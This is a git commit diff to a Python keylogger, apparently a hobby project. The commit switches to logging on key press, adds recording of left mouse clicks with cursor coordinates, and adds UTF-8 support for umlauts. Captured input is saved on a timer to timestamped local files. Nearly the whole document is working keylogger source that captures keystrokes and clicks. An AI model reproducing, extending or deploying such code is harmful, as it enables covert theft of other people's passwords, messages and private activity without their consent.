faf3ddbb15deb5458cbfd29d6d7bab45e1cb38f5
Kurzhalsgiraffe <max-hantschke@web.de>
2023-04-18 10:01:14 +0200

    added encoding
    - Now able to log "ÄÖÜ"
    - logging keyboard-repeat
    - logging mouse left click

--- keylogger.py
+++ keylogger.py
@@ -1,4 +1,6 @@
+# -*- coding: utf-8 -*-
 import keyboard
+import mouse
 from threading import Timer
 from datetime import datetime
 
@@ -11,7 +13,7 @@ class Keylogger:
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
 
-    def callback(self, event):
+    def keyboard_callback(self, event):
         """
         This callback is invoked whenever a keyboard event is occured
         (i.e when a key is released in this example)
@@ -27,25 +29,26 @@ class Keylogger:
             elif name == "decimal":
                 name = "."
             else:
-                # replace spaces with underscores
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
         self.log += name
-    
-    def update_filename(self):
-        # construct the filename to be identified by start & end datetimes
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
+    def mouse_callback(self):
+        self.log += f"[L_CLICK, {mouse.get_position()}]"
+    
     def report_to_file(self):
         """This method creates a log file in the current directory that contains
         the current keylogs in the `self.log` variable"""
+
+        # construct the filename to be identified by start & end datetimes
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
         # open the file in write mode (create it)
-        with open(f"{self.filename}.txt", "w") as f:
-            # write the keylogs to the file
-            print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")
+        with open(f"{filename}.txt", "w", encoding="utf-8") as file:
+            file.write(self.log)
+        print(f"Saved {filename}.txt")
 
     def report(self):
         """
@@ -54,31 +57,23 @@ class Keylogger:
         """
         if self.log:
             self.end_dt = datetime.now()
-            self.update_filename()
             self.report_to_file()
-
-            # if you don't want to print in the console, comment below line
-            print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
         self.log = ""
+
         timer = Timer(interval=self.interval, function=self.report)
-        # set the thread as daemon (dies when main thread die)
         timer.daemon = True
-        # start the timer
         timer.start()
 
     def start(self):
-        # record the start datetime
         self.start_dt = datetime.now()
-        # start the keylogger
-        keyboard.on_release(callback=self.callback)
-        # start reporting the keylogs
+        keyboard.on_press(callback=self.keyboard_callback)
+        mouse.on_click(callback=self.mouse_callback)
         self.report()
-        # make a simple message
+
         print(f"{datetime.now()} - Started keylogger")
-        # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
-    
+
 if __name__ == "__main__":
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
